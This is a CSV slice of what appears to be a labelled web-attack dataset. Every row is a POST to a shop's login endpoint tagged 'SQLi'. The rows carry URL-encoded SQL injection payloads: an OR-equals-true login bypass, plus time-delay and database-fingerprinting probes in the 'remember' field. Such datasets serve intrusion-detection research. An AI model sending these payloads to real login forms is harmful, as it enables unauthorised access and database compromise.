,id,method,path,query,label
2599,2599,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%29%20AND%208983%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29--%20AND%20%28%28%22GJtV%22%20LIKE%20%22GJtV&modo=entrar,SQLi
2600,2600,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%29%29%20AND%208983%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29--%20AND%20%28%28%28%22IPKA%22%20LIKE%20%22IPKA&modo=entrar,SQLi
2601,2601,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%20AND%208983%3DLIKE%28X%2741%27%7C%7CX%2742%27%7C%7CX%2743%27%7C%7CX%2744%27%7C%7CX%2745%27%7C%7CX%2746%27%7C%7CX%2747%27%2CUPPER%28HEX%28RANDOMBLOB%2850000000%29%29%29%29--%20AND%20%22VQUf%22%20LIKE%20%22VQUf&modo=entrar,SQLi
2602,2602,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%29%20AND%208362%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29&modo=entrar,SQLi
2603,2603,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20AND%208362%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29&modo=entrar,SQLi
2604,2604,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%20AND%208362%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29&modo=entrar,SQLi
2605,2605,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%20AND%208362%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29&modo=entrar,SQLi
2606,2606,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%29%20AND%208362%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29%20AND%20%284969%3D4969&modo=entrar,SQLi
2607,2607,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%29%29%20AND%208362%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29%20AND%20%28%286260%3D6260&modo=entrar,SQLi
2608,2608,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%29%29%29%20AND%208362%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29%20AND%20%28%28%283862%3D3862&modo=entrar,SQLi
2609,2609,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%20AND%208362%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29&modo=entrar,SQLi
2610,2610,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20AND%208362%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29%20AND%20%28%27YhYv%27%3D%27YhYv&modo=entrar,SQLi
2611,2611,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%20AND%208362%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29%20AND%20%28%28%27PRBC%27%3D%27PRBC&modo=entrar,SQLi
2612,2612,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%29%20AND%208362%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29%20AND%20%28%28%28%27anrl%27%3D%27anrl&modo=entrar,SQLi
2613,2613,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%20AND%208362%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29%20AND%20%27okZC%27%3D%27okZC&modo=entrar,SQLi
2614,2614,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20AND%208362%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29%20AND%20%28%27FuJA%27%20LIKE%20%27FuJA&modo=entrar,SQLi
2615,2615,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%20AND%208362%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29%20AND%20%28%28%27EePj%27%20LIKE%20%27EePj&modo=entrar,SQLi
2616,2616,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%29%20AND%208362%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29%20AND%20%28%28%28%27obgq%27%20LIKE%20%27obgq&modo=entrar,SQLi
2617,2617,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%20AND%208362%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29%20AND%20%27qrpt%27%20LIKE%20%27qrpt&modo=entrar,SQLi
2618,2618,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%20AND%208362%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29%20AND%20%28%22gDXv%22%3D%22gDXv&modo=entrar,SQLi
2619,2619,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%29%20AND%208362%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29%20AND%20%28%28%22eQtl%22%3D%22eQtl&modo=entrar,SQLi
2620,2620,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%29%29%20AND%208362%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29%20AND%20%28%28%28%22Tntu%22%3D%22Tntu&modo=entrar,SQLi
2621,2621,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%20AND%208362%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29%20AND%20%22EFsz%22%3D%22EFsz&modo=entrar,SQLi
2622,2622,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%20AND%208362%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29%20AND%20%28%22CpvC%22%20LIKE%20%22CpvC&modo=entrar,SQLi
2623,2623,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%29%20AND%208362%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29%20AND%20%28%28%22ZsFm%22%20LIKE%20%22ZsFm&modo=entrar,SQLi
2624,2624,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%29%29%20AND%208362%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29%20AND%20%28%28%28%22ZPtk%22%20LIKE%20%22ZPtk&modo=entrar,SQLi
2625,2625,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%20AND%208362%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29%20AND%20%22gXTx%22%20LIKE%20%22gXTx&modo=entrar,SQLi
2626,2626,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%29%20AND%206694%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29--&modo=entrar,SQLi
2627,2627,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20AND%206694%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29--&modo=entrar,SQLi
2628,2628,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%20AND%206694%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29--&modo=entrar,SQLi
2629,2629,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%20AND%206694%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29--&modo=entrar,SQLi
2630,2630,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%29%20AND%206694%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29--%20AND%20%287771%3D7771&modo=entrar,SQLi
2631,2631,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%29%29%20AND%206694%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29--%20AND%20%28%288378%3D8378&modo=entrar,SQLi
2632,2632,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%29%29%29%20AND%206694%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29--%20AND%20%28%28%285560%3D5560&modo=entrar,SQLi
2633,2633,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%20AND%206694%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29--&modo=entrar,SQLi
2634,2634,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20AND%206694%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29--%20AND%20%28%27iiqP%27%3D%27iiqP&modo=entrar,SQLi
2635,2635,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%20AND%206694%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29--%20AND%20%28%28%27TqTF%27%3D%27TqTF&modo=entrar,SQLi
2636,2636,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%29%20AND%206694%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29--%20AND%20%28%28%28%27nLet%27%3D%27nLet&modo=entrar,SQLi
2637,2637,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%20AND%206694%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29--%20AND%20%27wKxb%27%3D%27wKxb&modo=entrar,SQLi
2638,2638,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20AND%206694%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29--%20AND%20%28%27YBnM%27%20LIKE%20%27YBnM&modo=entrar,SQLi
2639,2639,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%20AND%206694%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29--%20AND%20%28%28%27vbrj%27%20LIKE%20%27vbrj&modo=entrar,SQLi
2640,2640,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%29%20AND%206694%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29--%20AND%20%28%28%28%27YoXg%27%20LIKE%20%27YoXg&modo=entrar,SQLi
2641,2641,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%20AND%206694%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29--%20AND%20%27FYzM%27%20LIKE%20%27FYzM&modo=entrar,SQLi
2642,2642,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%20AND%206694%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29--%20AND%20%28%22xmkN%22%3D%22xmkN&modo=entrar,SQLi
2643,2643,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%29%20AND%206694%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29--%20AND%20%28%28%22CpJk%22%3D%22CpJk&modo=entrar,SQLi
2644,2644,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%29%29%20AND%206694%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29--%20AND%20%28%28%28%22gZOB%22%3D%22gZOB&modo=entrar,SQLi
2645,2645,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%20AND%206694%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29--%20AND%20%22PVST%22%3D%22PVST&modo=entrar,SQLi
2646,2646,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%20AND%206694%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29--%20AND%20%28%22sRQc%22%20LIKE%20%22sRQc&modo=entrar,SQLi
2647,2647,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%29%20AND%206694%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29--%20AND%20%28%28%22pLnM%22%20LIKE%20%22pLnM&modo=entrar,SQLi
2648,2648,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%29%29%20AND%206694%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29--%20AND%20%28%28%28%22QiLq%22%20LIKE%20%22QiLq&modo=entrar,SQLi
2649,2649,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%20AND%206694%3D%28SELECT%20COUNT%28%2A%29%20FROM%20RDB%24FIELDS%20AS%20T1%2CRDB%24TYPES%20AS%20T2%2CRDB%24COLLATIONS%20AS%20T3%29--%20AND%20%22pRwZ%22%20LIKE%20%22pRwZ&modo=entrar,SQLi
2650,2650,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%29%20AND%208309%3D%28SELECT%20COUNT%28%2A%29%20FROM%20DOMAIN.DOMAINS%20AS%20T1%2C%20DOMAIN.COLUMNS%20AS%20T2%2C%20DOMAIN.TABLES%20AS%20T3%29&modo=entrar,SQLi
2651,2651,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20AND%208309%3D%28SELECT%20COUNT%28%2A%29%20FROM%20DOMAIN.DOMAINS%20AS%20T1%2C%20DOMAIN.COLUMNS%20AS%20T2%2C%20DOMAIN.TABLES%20AS%20T3%29&modo=entrar,SQLi
2652,2652,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%20AND%208309%3D%28SELECT%20COUNT%28%2A%29%20FROM%20DOMAIN.DOMAINS%20AS%20T1%2C%20DOMAIN.COLUMNS%20AS%20T2%2C%20DOMAIN.TABLES%20AS%20T3%29&modo=entrar,SQLi
2653,2653,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%20AND%208309%3D%28SELECT%20COUNT%28%2A%29%20FROM%20DOMAIN.DOMAINS%20AS%20T1%2C%20DOMAIN.COLUMNS%20AS%20T2%2C%20DOMAIN.TABLES%20AS%20T3%29&modo=entrar,SQLi
2654,2654,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%29%20AND%208309%3D%28SELECT%20COUNT%28%2A%29%20FROM%20DOMAIN.DOMAINS%20AS%20T1%2C%20DOMAIN.COLUMNS%20AS%20T2%2C%20DOMAIN.TABLES%20AS%20T3%29%20AND%20%289818%3D9818&modo=entrar,SQLi
2655,2655,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%29%29%20AND%208309%3D%28SELECT%20COUNT%28%2A%29%20FROM%20DOMAIN.DOMAINS%20AS%20T1%2C%20DOMAIN.COLUMNS%20AS%20T2%2C%20DOMAIN.TABLES%20AS%20T3%29%20AND%20%28%281789%3D1789&modo=entrar,SQLi
2656,2656,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%29%29%29%20AND%208309%3D%28SELECT%20COUNT%28%2A%29%20FROM%20DOMAIN.DOMAINS%20AS%20T1%2C%20DOMAIN.COLUMNS%20AS%20T2%2C%20DOMAIN.TABLES%20AS%20T3%29%20AND%20%28%28%286432%3D6432&modo=entrar,SQLi
2657,2657,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%20AND%208309%3D%28SELECT%20COUNT%28%2A%29%20FROM%20DOMAIN.DOMAINS%20AS%20T1%2C%20DOMAIN.COLUMNS%20AS%20T2%2C%20DOMAIN.TABLES%20AS%20T3%29&modo=entrar,SQLi
2658,2658,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20AND%208309%3D%28SELECT%20COUNT%28%2A%29%20FROM%20DOMAIN.DOMAINS%20AS%20T1%2C%20DOMAIN.COLUMNS%20AS%20T2%2C%20DOMAIN.TABLES%20AS%20T3%29%20AND%20%28%27tElB%27%3D%27tElB&modo=entrar,SQLi
2659,2659,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%20AND%208309%3D%28SELECT%20COUNT%28%2A%29%20FROM%20DOMAIN.DOMAINS%20AS%20T1%2C%20DOMAIN.COLUMNS%20AS%20T2%2C%20DOMAIN.TABLES%20AS%20T3%29%20AND%20%28%28%27qioZ%27%3D%27qioZ&modo=entrar,SQLi
2660,2660,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%29%20AND%208309%3D%28SELECT%20COUNT%28%2A%29%20FROM%20DOMAIN.DOMAINS%20AS%20T1%2C%20DOMAIN.COLUMNS%20AS%20T2%2C%20DOMAIN.TABLES%20AS%20T3%29%20AND%20%28%28%28%27DRYs%27%3D%27DRYs&modo=entrar,SQLi
2661,2661,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%20AND%208309%3D%28SELECT%20COUNT%28%2A%29%20FROM%20DOMAIN.DOMAINS%20AS%20T1%2C%20DOMAIN.COLUMNS%20AS%20T2%2C%20DOMAIN.TABLES%20AS%20T3%29%20AND%20%27pJBj%27%3D%27pJBj&modo=entrar,SQLi
2662,2662,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%20AND%208309%3D%28SELECT%20COUNT%28%2A%29%20FROM%20DOMAIN.DOMAINS%20AS%20T1%2C%20DOMAIN.COLUMNS%20AS%20T2%2C%20DOMAIN.TABLES%20AS%20T3%29%20AND%20%28%27vuDi%27%20LIKE%20%27vuDi&modo=entrar,SQLi
2663,2663,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%20AND%208309%3D%28SELECT%20COUNT%28%2A%29%20FROM%20DOMAIN.DOMAINS%20AS%20T1%2C%20DOMAIN.COLUMNS%20AS%20T2%2C%20DOMAIN.TABLES%20AS%20T3%29%20AND%20%28%28%27sUNk%27%20LIKE%20%27sUNk&modo=entrar,SQLi
2664,2664,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%29%29%29%20AND%208309%3D%28SELECT%20COUNT%28%2A%29%20FROM%20DOMAIN.DOMAINS%20AS%20T1%2C%20DOMAIN.COLUMNS%20AS%20T2%2C%20DOMAIN.TABLES%20AS%20T3%29%20AND%20%28%28%28%27mxBP%27%20LIKE%20%27mxBP&modo=entrar,SQLi
2665,2665,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%27%20AND%208309%3D%28SELECT%20COUNT%28%2A%29%20FROM%20DOMAIN.DOMAINS%20AS%20T1%2C%20DOMAIN.COLUMNS%20AS%20T2%2C%20DOMAIN.TABLES%20AS%20T3%29%20AND%20%27qOzr%27%20LIKE%20%27qOzr&modo=entrar,SQLi
2666,2666,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=%22%29%20AND%208309%3D%28SELECT%20COUNT%28%2A%29%20FROM%20DOMAIN.DOMAINS%20AS%20T1%2C%20DOMAIN.COLUMNS%20AS%20T2%2C%20DOMAIN.TABLES%20AS%20T3%29%20AND%20%28%22UJbE%22%3D%22UJbE&modo=entrar,SQLi
